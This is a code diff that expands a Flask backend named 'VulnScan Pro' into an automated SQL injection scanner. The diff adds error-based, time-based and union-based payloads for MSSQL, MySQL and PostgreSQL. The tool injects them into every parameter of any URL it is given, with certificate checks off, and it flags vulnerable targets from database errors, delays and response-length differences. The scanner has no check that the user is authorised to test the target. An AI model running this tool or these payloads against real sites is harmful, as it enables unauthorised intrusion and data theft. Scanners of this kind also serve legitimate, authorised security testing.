@@ -1,21 +1,87 @@
 from flask import Flask, request, jsonify, send_from_directory
 import requests as req
+import time
+import json
+import re
+from datetime import datetime
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 app = Flask(__name__, static_folder='static')
 
-payloads = [
-    "' OR '1'='1",
-    "' OR 1=1 --",
-    "' OR 'a'='a",
-    "\" OR \"1\"=\"1",
-    "' OR ''='",
-    "' OR 1=1#"
-]
+# --- Expanded payload sets by technique ---
+PAYLOADS = {
+    "error_based": [
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "' OR 'a'='a",
+        "\" OR \"1\"=\"1",
+        "' OR ''='",
+        "' OR 1=1#",
+        "' AND 1=CONVERT(int, 'a') --",   # MSSQL
+        "' AND extractvalue(1,concat(0x7e,version())) --",  # MySQL
+        "' AND 1=1 UNION SELECT null --",
+    ],
+    "time_based": [
+        "'; WAITFOR DELAY '0:0:5' --",     # MSSQL
+        "' OR SLEEP(5) --",                # MySQL
+        "'; SELECT pg_sleep(5) --",        # PostgreSQL
+        "' OR 1=1 AND SLEEP(5) --",
+        "1; WAITFOR DELAY '0:0:5' --",
+    ],
+    "union_based": [
+        "' UNION SELECT null --",
+        "' UNION SELECT null,null --",
+        "' UNION SELECT null,null,null --",
+        "' UNION ALL SELECT 'vuln','vuln' --",
+    ]
+}
 
 ERROR_KEYWORDS = [
     "sql syntax", "mysql_fetch", "ora-", "odbc driver",
-    "sqlite_", "pg_query", "syntax error", "unclosed quotation"
+    "sqlite_", "pg_query", "syntax error", "unclosed quotation",
+    "microsoft ole db", "jdbc", "sqlexception", "mysql_num_rows",
+    "supplied argument is not a valid mysql", "division by zero",
+    "invalid query", "sql command not properly ended"
 ]
+
+TIME_THRESHOLD = 4.0  # seconds — flag if response takes longer than this
+
+def extract_injectable_params(url):
+    """Auto-extract all GET parameters from URL."""
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    return list(params.keys()), parsed
+
+def inject_param(parsed_url, params_dict, param_name, payload):
+    """Inject payload into a specific parameter."""
+    new_params = dict(params_dict)
+    new_params[param_name] = payload
+    new_query = urlencode(new_params)
+    new_parsed = parsed_url._replace(query=new_query)
+    return urlunparse(new_parsed)
+
+def calculate_risk_score(results):
+    """Generate a 0-100 risk score based on findings."""
+    score = 0
+    for r in results:
+        if r.get('vulnerable'):
+            technique = r.get('technique', '')
+            if technique == 'time_based':
+                score += 35   # High confidence — hard to false positive
+            elif r.get('error_keyword'):
+                score += 30   # DB error leaked — critical
+            elif technique == 'union_based':
+                score += 25
+            else:
+                score += 15   # Length diff only — lower confidence
+    return min(score, 100)
+
+def risk_label(score):
+    if score >= 70: return "CRITICAL"
+    if score >= 40: return "HIGH"
+    if score >= 20: return "MEDIUM"
+    if score > 0:   return "LOW"
+    return "SAFE"
 
 @app.route('/')
 def index():
@@ -29,49 +95,113 @@ def serve_static(path):
 def scan():
     data = request.json
     url = data.get('url', '').strip()
-    method = data.get('method', 'GET')
-    timeout = int(data.get('timeout', 5))
+    method = data.get('method', 'GET').upper()
+    timeout = int(data.get('timeout', 8))
 
     if not url:
         return jsonify({'error': 'No URL provided'}), 400
 
+    # --- Auto-extract parameters ---
+    parsed_url = urlparse(url)
+    params_dict = {k: v[0] for k, v in parse_qs(parsed_url.query).items()}
+    param_names = list(params_dict.keys()) or ['input']
+
     results = []
+    scan_meta = {
+        "url": url,
+        "method": method,
+        "timestamp": datetime.utcnow().isoformat() + "Z",
+        "params_found": param_names
+    }
+
+    # --- Baseline request ---
     try:
+        start = time.time()
         if method == 'GET':
             baseline = req.get(url, timeout=timeout, verify=False)
         else:
             baseline = req.post(url, data={'input': 'test'}, timeout=timeout, verify=False)
+        baseline_time = time.time() - start
         normal_length = len(baseline.text)
     except Exception as e:
         return jsonify({'error': f'Baseline request failed: {str(e)}'}), 500
 
-    for payload in payloads:
-        try:
-            if method == 'GET':
-                response = req.get(url + payload, timeout=timeout, verify=False)
-            else:
-                response = req.post(url, data={'input': payload}, timeout=timeout, verify=False)
+    # --- Run all payload categories ---
+    for technique, payload_list in PAYLOADS.items():
+        for payload in payload_list:
+            for param in param_names:
+                try:
+                    start = time.time()
 
-            diff = abs(normal_length - len(response.text))
-            error_found = any(k in response.text.lower() for k in ERROR_KEYWORDS)
-            vulnerable = diff > 50 or error_found
+                    if method == 'GET':
+                        if params_dict:
+                            test_url = inject_param(parsed_url, params_dict, param, payload)
+                        else:
+                            test_url = url + payload
+                        response = req.get(test_url, timeout=timeout, verify=False)
+                    else:
+                        post_data = dict(params_dict) if params_dict else {}
+                        post_data[param] = payload
+                        response = req.post(url, data=post_data, timeout=timeout, verify=False)
 
-            results.append({
-                'payload': payload,
-                'diff': diff,
-                'vulnerable': vulnerable,
-                'error_keyword': error_found
-            })
-        except Exception as e:
-            results.append({
-                'payload': payload,
-                'diff': 0,
-                'vulnerable': False,
-                'error': str(e)
-            })
+                    elapsed = time.time() - start
+                    diff = abs(normal_length - len(response.text))
+                    error_found = any(k in response.text.lower() for k in ERROR_KEYWORDS)
 
-    return jsonify({'baseline': normal_length, 'results': results})
+                    # Time-based: flag if response took suspiciously long
+                    time_anomaly = (technique == 'time_based' and
+                                    elapsed >= TIME_THRESHOLD and
+                                    elapsed >= baseline_time + 3.0)
 
+                    vulnerable = time_anomaly or error_found or (diff > 50 and technique != 'time_based')
+
+                    results.append({
+                        'payload': payload,
+                        'technique': technique,
+                        'parameter': param,
+                        'diff': diff,
+                        'response_time': round(elapsed, 2),
+                        'baseline_time': round(baseline_time, 2),
+                        'vulnerable': vulnerable,
+                        'error_keyword': error_found,
+                        'time_anomaly': time_anomaly,
+                    })
+
+                except Exception as e:
+                    results.append({
+                        'payload': payload,
+                        'technique': technique,
+                        'parameter': param,
+                        'diff': 0,
+                        'vulnerable': False,
+                        'error': str(e)
+                    })
+
+    # --- Risk scoring ---
+    score = calculate_risk_score(results)
+    label = risk_label(score)
+
+    return jsonify({
+        'meta': scan_meta,
+        'baseline_length': normal_length,
+        'baseline_time': round(baseline_time, 2),
+        'results': results,
+        'risk_score': score,
+        'risk_label': label,
+        'vulnerable_count': sum(1 for r in results if r.get('vulnerable')),
+        'total_tests': len(results)
+    })
+
+@app.route('/export', methods=['POST'])
+def export_report():
+    """Return a structured JSON report for download."""
+    data = request.json
+    report = {
+        "report_generated": datetime.utcnow().isoformat() + "Z",
+        "tool": "VulnScan Pro",
+        "scan": data
+    }
+    return jsonify(report)
 
 if __name__ == '__main__':
     print("\n  VulnScan Pro — Flask Backend")
